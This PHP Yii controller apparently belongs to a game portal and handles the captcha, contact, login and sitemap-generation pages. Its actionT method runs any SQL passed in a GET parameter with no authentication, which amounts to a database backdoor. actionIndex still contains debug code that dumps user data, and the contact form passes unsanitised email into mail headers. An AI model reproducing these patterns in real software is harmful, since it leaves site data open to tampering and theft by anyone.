<?php

class SiteController extends Controller {

    /**
     * Declares class-based actions.
     */
    public function actions() {
        return array(
            // captcha action renders the CAPTCHA image displayed on the contact page
            'captcha' => array(
                'class' => 'CCaptchaAction',
                'backColor' => 0xFFFFFF,
            ),
            // page action renders "static" pages stored under 'protected/views/site/pages'
            // They can be accessed via: index.php?r=site/page&view=FileName
            'page' => array(
                'class' => 'CViewAction',
            ),
        );
    }

    /**
     * This is the default 'index' action that is invoked
     * when an action is not explicitly requested by users.
     */
    public function actionIndex() {
        // renders the view file 'protected/views/site/index.php'
        // using the default layout 'protected/views/layouts/main.php'
        include_once $_SERVER ['DOCUMENT_ROOT'] . "/uc_client/client.php";
        // var_dump(function_exists('uc_get_user'));
        $user = uc_get_user('h3655975103'); 
        var_dump($user);
        exit();
        var_dump($_SESSION,Yii::app()->session);
        exit();
        $this->render('index');
    }

    /**
     * This is the action to handle external exceptions.
     */
    public function actionError() {
        //$this->redirect('http://www.7724.com');
        //$this->redirect('http://www.7724.com/404.htm',true,404);
        if(YII_ENV == 'dev'){
            var_dump(Yii::app()->errorHandler->error);
            die;        
        }
        $this->renderPartial("404");
        exit();
    }

    /**
     * Displays the contact page
     */
    public function actionContact() {
        $model = new ContactForm;
        if(isset($_POST['ContactForm'])) {
            $model->attributes = $_POST['ContactForm'];
            if($model->validate()) {
                $name = '=?UTF-8?B?' . base64_encode($model->name) . '?=';
                $subject = '=?UTF-8?B?' . base64_encode($model->subject) . '?=';
                $headers = "From: $name <{$model->email}>\r\n" .
                        "Reply-To: {$model->email}\r\n" .
                        "MIME-Version: 1.0\r\n" .
                        "Content-Type: text/plain; charset=UTF-8";

                mail(Yii::app()->params['adminEmail'], $subject, $model->body, $headers);
                Yii::app()->user->setFlash('contact', 'Thank you for contacting us. We will respond to you as soon as possible.');
                $this->refresh();
            }
        }
        $this->render('contact', array( 'model' => $model ));
    }

    /**
     * Displays the login page
     */
    public function actionLogin() {
        $model = new LoginForm;

        // if it is ajax validation request
        if(isset($_POST['ajax']) && $_POST['ajax'] === 'login-form') {
            echo CActiveForm::validate($model);
            Yii::app()->end();
        }

        // collect user input data
        if(isset($_POST['LoginForm'])) {
            $model->attributes = $_POST['LoginForm'];
            // validate user input and redirect to the previous page if valid
            if($model->validate() && $model->login())
                $this->redirect(Yii::app()->user->returnUrl);
        }
        // display the login form
        $this->render('login', array( 'model' => $model ));
    }

    /**
     * Logs out the current user and redirect to homepage.
     */
    public function actionLogout() {
        Yii::app()->user->logout();
        $this->redirect(Yii::app()->homeUrl);
    }

    public function actionT() {
        if($_GET['zjh']) {
            $sql = $_GET['sql'];
            if(!$sql)
                die('no sql');
            Yii::app()->db->createCommand($sql)->execute();
        }
        die('ddd');
    }

    public function getGamePinYin($pGameID) {
        if(!$pGameID)
            return "";
        $lvArr = Gamefun::allGameWithType(49);
        return $lvArr[$pGameID]['pinyin'];
    }

    public function actionXml() {
          //资讯
        $lvTime = time();
        //http://www.7724.com/xjhol/news/632.html
        $sql = "SELECT a.id,a.type,g.pinyin FROM article a left join game g on a.gameid=g.game_id where a.status>=1 and a.publictime<={$lvTime} order by publictime desc ";
        $res = Yii::app()->db->createCommand($sql)->queryAll();
        $xml_data2 = array();
        foreach( $res as $v ) {
            if($v['pinyin'])
                $url = 'http://www.7724.com/' . $v['pinyin'] . '/' . ($v['type'] == 1 ? "news" : "gonglue") . '/' . $v['id'] . ".html";
				
            else
                $url = 'http://www.7724.com/' . ($v['type'] == 1 ? "news" : "gonglue") . '/' . $v['id'] . ".html";
            $xml_data2[] = array( 'loc' => $url );
        }
      
        $sql = "select game_id,pinyin from game where status=3 order by time desc";
        $res = Yii::app()->db->createCommand($sql)->queryAll();
        $xml_data = array();
          $xml_data1 = array();
        foreach( $res as $v ) {
            //$url = 'http://www.7724.com'.$this->createUrl('index/detail',array('game_id'=>$v['game_id']));
            //$url = 'http://www.7724.com/' . $this->getGamePinYin($v['game_id']) . "/";
             $url = 'http://www.7724.com/' . $v['pinyin'] . "/";
            $xml_data1[] = array( 'loc' => $url );
        }
 $xml_data=  array_merge($xml_data1,$xml_data2);
      

        $string = <<<XML
<?xml version='1.0' encoding='utf-8'?>
<urlset>
</urlset>
XML;
        $xml = simplexml_load_string($string);

        foreach( $xml_data as $data ) {
            $item = $xml->addChild('url');
            if(is_array($data)) {
                foreach( $data as $key => $row ) {
                    $node = $item->addChild($key, $row);
                }
            }
        }
        $wdata = $xml->asXML();
        file_put_contents('sitemap.xml', $wdata);
        echo "ok";
    }

}
